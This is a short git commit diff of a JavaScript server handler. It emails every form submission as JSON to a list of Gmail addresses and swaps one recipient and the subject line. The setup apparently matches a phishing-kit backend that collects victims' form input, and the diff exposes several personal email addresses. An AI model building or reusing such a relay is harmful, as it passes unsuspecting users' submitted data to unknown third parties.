1dbd35381867280865bc9a62077097078eedf664
zm9807350 <zm9807350@gmail.com>
2026-01-21 17:55:42 +0500

    Update and rename zaman.js to Ashraf.js

--- Ashraf.js
+++ Ashraf.js
@@ -37,8 +37,8 @@ export default async function handler(req, res) {
   try {
     await transporter.sendMail({
       from: `"PROFESSOR" <dardhame1@gmail.com>`,
-      to: "linkquarry@gmail.com,submitdispute@gmail.com,newzatpage@gmail.com,zamannizamani69@gmail.com",
-      subject: "zaman",
+      to: "linkquarry@gmail.com,submitdispute@gmail.com,newzatpage@gmail.com,ccntnizamani@gmail.com",
+      subject: "Ashraf",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>New submission from Asif</h3><pre>${JSON.stringify(
         formData,
